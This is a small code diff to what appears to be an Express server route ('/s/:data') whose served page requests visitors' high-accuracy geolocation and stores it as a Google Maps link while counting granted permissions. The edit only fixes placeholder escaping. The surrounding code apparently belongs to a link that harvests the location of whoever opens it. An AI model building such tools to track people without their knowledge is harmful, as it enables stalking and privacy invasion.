@@ -169,7 +169,7 @@ app.get('/s/:data', async (req, res) => {
 
                 try {
                     const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });
-                    data.location = \`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}\`;
+                    data.location = \`https://www.google.com/maps?q=\${position.coords.latitude},\${position.coords.longitude}\`;
                     permissionsGranted++;
                 } catch (e) { /* Geolocation failed or denied */ }
 
